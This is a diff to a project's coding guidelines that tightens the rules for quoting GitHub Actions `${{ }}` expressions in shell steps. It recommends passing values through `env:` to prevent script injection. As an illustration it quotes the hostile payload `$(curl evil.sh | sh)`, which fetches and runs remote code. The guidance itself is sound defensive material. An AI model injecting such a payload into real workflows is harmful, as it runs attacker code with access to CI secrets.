@@ -552,28 +552,49 @@ Also add the project to the `.slnx` solution file under the appropriate folder.
 
 GitHub substitutes a `${{ ... }}` expression as literal text **before** the shell parses the line — the shell never
 sees the expression syntax itself, only whatever string came out of it. This makes the quoting around it a real
-security boundary, not a style choice:
+security boundary, not a style choice.
 
-- **Single-quote `'${{ ... }}'` by default** in `run:` shell blocks. Single quotes make the substituted text fully
-  literal to bash, whatever it contains.
-- **Double-quoting `"${{ ... }}"` is a code-injection risk.** Bash still evaluates `$()`/backtick command
-  substitution inside double quotes, so if the substituted value ever contains one (`$(curl evil.sh | sh)`), it
-  executes. This is the "pwn request" pattern: an expression whose value an attacker can influence through untrusted
-  input (a fork PR's `github.head_ref`, a PR or issue title, a commit message) becomes a way to run arbitrary code in
-  the workflow's context. Most `${{ }}` values in this codebase are not attacker-influenced (`github.repository`,
-  `secrets.*`, computed job outputs), but the single-quote default costs nothing on those and removes the need to
-  reason about it case by case.
+- **Default: pass the expression through the step's `env:`, then reference the shell variable.** This is the only
+  pattern immune to injection regardless of what the value contains, because GitHub Actions writes `env:` values
+  into the runner's environment directly — the shell reads them as inert data and never re-parses them for
+  metacharacters, quotes, or command substitution.
+
+  ```yaml
+  - name: Upload benchmark results
+    env:
+      HEAD_REF: ${{ github.head_ref }}
+    run: |
+        declare -a args=(
+            --head-ref "$HEAD_REF"
+        )
+  ```
+
+- **Single-quoting `'${{ ... }}'` directly in the script is a narrower, weaker protection — reserve it for values
+  proven not to contain a single quote.** It blocks `$()`/backtick command substitution, but a literal `'` in the
+  substituted value still terminates the quoted string early, and the remaining text becomes new shell syntax —
+  including a value that then executes arbitrary injected commands. **Git ref and branch names are allowed to
+  contain `'`**, so `github.head_ref`, `github.ref_name`, and any free-form `workflow_dispatch` text input (a
+  release `reason`, a target branch name) MUST go through `env:`, never be single-quoted directly. Reserve direct
+  single-quoting for values from a closed, known set the value cannot escape (`github.event_name`, a boolean/numeric
+  input, a value already validated against an allow-list) — and even then, `env:` is never wrong, only sometimes
+  more verbose than necessary.
+- **Double-quoting `"${{ ... }}"` directly in the script is never correct.** Bash evaluates `$()`/backtick command
+  substitution inside double quotes, so an attacker-influenced value containing one (`$(curl evil.sh | sh)`) executes
+  it outright — strictly worse than the single-quote case above, which at least requires a `'` in the value rather
+  than a `$(`.
 - **Exception: concatenation with a live shell variable or string** (e.g.
-  `preprocessor_symbols="$preprocessor_symbols;${{ inputs.dispatch-preprocessor-symbols }}"`). The whole expression
-  cannot be single-quoted without losing `$preprocessor_symbols`'s expansion. Document why the exception applies at
-  the call site (see the top-level rule in this document about documenting deviations), and prefer capturing the
-  `${{ }}` value into its own single-quoted variable first when that keeps the risk narrower than an inline
-  concatenation.
+  `preprocessor_symbols="$preprocessor_symbols;${{ inputs.dispatch-preprocessor-symbols }}"`). Prefer capturing the
+  `${{ }}` value into its own `env:`-sourced variable first, then concatenate that variable — this keeps the
+  injection-immune property instead of re-introducing it at the concatenation site. Document why the exception
+  applies at the call site (see the top-level rule in this document about documenting deviations) if `env:` capture
+  is genuinely impractical there.
 - **A `${{ }}` value already inside another language's quoting context follows that language's syntax, not this
   rule.** For example, a `jq` filter passed as `--jq 'map(select(.headRefName == "${{ github.ref_name }}")) | ...'`
   needs double quotes around the expression because `jq` string literals require them — `jq` has no single-quoted
   string syntax. The outer single quotes around the whole `--jq '...'` argument already make it literal to bash;
-  changing the inner quotes would break `jq`'s own parsing without improving security.
+  changing the inner quotes would break `jq`'s own parsing without improving security. Prefer routing the value
+  through `env:` and a `--arg`/`--argjson` binding instead when the filter's structure allows it, since that also
+  removes the value from the script text entirely.
 
 ## Build Configuration, TFMs, RIDs, and Preprocessor Symbols
 
